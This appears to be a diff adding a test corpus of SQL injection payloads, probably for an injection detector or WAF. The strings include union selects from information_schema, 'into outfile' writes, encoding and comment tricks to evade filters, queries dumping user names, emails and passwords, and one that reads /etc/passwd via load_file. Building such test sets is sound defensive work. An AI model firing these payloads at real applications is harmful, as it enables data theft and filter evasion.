@@ -1,0 +1,100 @@
+1- 'xxx' union(select table_name from information_schema.tables limit 1,1)
+1- union(select table_name from information_schema.tables limit 1,1)
+@version - @version union(select table_name from information_schema.tables limit 1,1)
+@version- 'xxx' union(select table_name from information_schema.tables limit 1,1)
+@version - 5 union(select table_name from information_schema.tables limit 1,1)
+1 into outfile 'asd'
+1 into outfile 'asd'--
+'1' into outfile 'asd'
+'1' into outfile 'asd' --
+@version into outfile 'asd'
+@version into outfile 'asd' --
+1 into outfile ('asd')
+'1' into outfile ('asd')
+@version into outfile ('asd')
+1 into outfile substring('asd', 10, 1)
+'1' into outfile substring('asd', 10, 1)
+@version into outfile substring('asd', 10 1)
+1 into outfile (substring('asd', 10, 1))
+'1' into outfile (substring('asd', 10, 1))
+@version into outfile (substring('asd', 10 1))
+%28select+substr%0D%0A%28login%0D%0A%0D%0A%29%0D%0Afrom+users+limit+1%2C1%29
+union%20%28select+id+from+users+limit+1%2C1%29
+1%0Aand+current_user=notthere()
+1%0Aand+current_user=1
+1%0Aand+current_user=@version
+1%0Aand+current_user='junk'
+1%0Aand+current_user=foo
+--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+1'--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+@version--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+-.1a%20union%20%28select+id+from+users+limit+1%2C1%29
+case 1 when 2 then 2 end
+case sin(1) when 2 then 2 end
+case '1' when 2 then 2 end
+case 1 when 's' then 2 end
+case when 2 then 3 end
+case when 's' then 3 end
+case when f(1) then 3 end
+-1 union select table_name asda from information_schema.tables
+-1 union select table_name "asda" from information_schema.tables
+-1 union select table_name `asda` from information_schema.tables
+-1 union select table_name as asda from information_schema.tables
+-1 union select table_name as "asda" from information_schema.tables
+-1 union select table_name as `asda` from information_schema.tables
+a'and(select(binary(/*!system_user()*/)))like'reading%25
+-1 union select @``"", table_name from information_schema.tables
+'foo' union select @``"", table_name from information_schema.tables
+@version union select @``"", table_name from information_schema.tables
+select @version foo
+select @version "foo"
+select @version foo -- junk
+select @version "foo" -- junk
+$$pgsql evade$$ union select * from foo
+$foo$pgsql evade$foo$ union select * from foo
+u&'pgsql evade' union select * from foo
+U&'pgsql evade' union select * from foo
+U&'pgsql evade' uescape '!' union select * from foo
+_latin1'foo' union select * from foo
+_LATIN7'foo' union select * from foo
+_utf8'foo' union select * from foo
+REAL 1 union select * from foo
+1::REAL union select * from foo
+1::REAL::REAL union select * from foo
+-1 union select @``"", table_name from information_schema.tables
+!~1 union select table_name from information_schema.tables
+-1 union select @a`from 1`, table_name from information_schema.tables
+version() union select table_name from information_schema.tables
+-1 LOCK IN SHARE MODE UNION SELECT table_name from information_schema.tables
+1 is unknown union select table_name from information_schema.tables
+true is not unknown for update union select table_name from information_schema.tables
+1 for update union select 1
+ (true)-(true)union select table_name from information_schema.tables
+(@a)-(@a)union select table_name from information_schema.tables
+1 OR (1 OR 1)--
+(1) OR (1 OR 1)--
+((1) OR (1 OR 1))--
+((1) OR ((1 OR 1)))--
+1 OR ((1 OR 1)) --
+1 OR ((1) OR 1) --
+(@x OR @y) UNION ALL SELECT name,email,password FROM users-- 
+(@x OR (@y)) UNION ALL SELECT name,email,password FROM users-- 
+((@x) OR @y) UNION ALL SELECT name,email,password FROM users-- 
+(@x) OR (@y) UNION ALL SELECT name,email,password FROM users-- 
+@x) OR (@y) UNION ALL SELECT name,email,password FROM users-- 
+@x OR (@y) UNION ALL SELECT name,email,password FROM users--
+(SELECT 1 FROM DUAL)
+(SELECT @a FROM DUAL) UNION ALL SELECT 1, 2, 3--
+(SELECT (1) FROM DUAL)
+(select @version from dual)
+(select (@version - 1) from dual)
+(select ('foo' - 1) from dual)
+(select 'foo' from dual)
+(select 1 foobar from dual)
+1 and 1 not between 0 and 1
+1 AND 1 SOUNDS LIKE 1
+1 AND 1 NOT LIKE 0
+'-(1 or 1) and 1=0 union select load_file('/etc/passwd'),credit_card,password from users-- -
+'-(-1 or -1) and 1=0 union
+'-(-(1) or -1) and 1=0 union
+'-((1) or -1) and 1=0 union
